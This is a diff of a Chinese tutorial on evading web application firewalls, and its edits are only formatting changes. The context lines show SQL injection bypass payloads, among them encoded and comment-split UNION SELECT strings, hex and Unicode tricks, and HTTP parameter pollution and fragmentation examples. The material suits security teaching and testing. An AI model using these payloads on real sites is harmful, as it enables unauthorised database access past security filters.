@@ -41,7 +41,7 @@ ls命令可以通过以下语法代替执行：
 
 - **OWASP ModSecurity 核心规则集**
 
-PL1~PL4
+－　**PL1~PL4**
 
 　　以下注释很好的概述了每个级别在“REQUEST PROTOCOL ENFORCEMENT”规则上的工作原理。可以看到PL1，一个查询字符串只能包含1-255范围内的ASCII字符，直到PL4在非常小的范围内阻止所有不是ASCII的字符。
 ```
@@ -91,12 +91,12 @@ http://target.com/index.php?page_id=-15&nbsp;UNIunionON SELselectECT 1,2,3,4
 ```
 page.php?id=1%252f%252a*/UNION%252f%252a /SELECT
 ```
-+Hex encode
++ Hex encode
 ```
 target.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…
 　　　SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
 ```
-+Unicode encode
++ Unicode encode
 ```
 ?id=10%D6‘%20AND%201=2%23　　
 　　　SELECT 'Ä'='A'; #1
@@ -128,7 +128,7 @@ mid()、substr() ==> substring()
 
 6 使用特殊符号
 
-这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法。
+　　这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法。
 ```
 + ` symbol: select `version()`;
 + +- :select+id-1+1.from users;
@@ -136,7 +136,7 @@ mid()、substr() ==> substring()
 +Mysql function() as xxx
 +`、~、!、@、%、()、[]、.、-、+ 、|、%00
 ```
-示例
+　　示例
 ```
 ‘se’+’lec’+’t’
 　　　　　　%S%E%L%E%C%T 1
@@ -157,7 +157,7 @@ mid()、substr() ==> substring()
 ```
 　　HPP又称做重复参数污染，最简单的就是?uid=1&uid=2&uid=3.
 
-+HPF (HTTP Parameter Fragment)
++ HPF (HTTP Parameter Fragment)
 
 这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)
 ```
@@ -165,7 +165,7 @@ mid()、substr() ==> substring()
 　　select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—
 ```
 
-+HPC (HTTP Parameter Contamination)
++ HPC (HTTP Parameter Contamination)
 
 RFC2396定义了以下字符：
 ```
@@ -173,7 +173,7 @@ Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' ()
 Reserved : ; / ? : @ &amp; = + $ ,
 Unwise : { } | \ ^ [ ] `
 ```
-不同的Web服务器处理处理构造得特殊请求时有不同的逻辑.
+　　不同的Web服务器处理处理构造得特殊请求时有不同的逻辑.
 
 8 缓冲区溢出
 
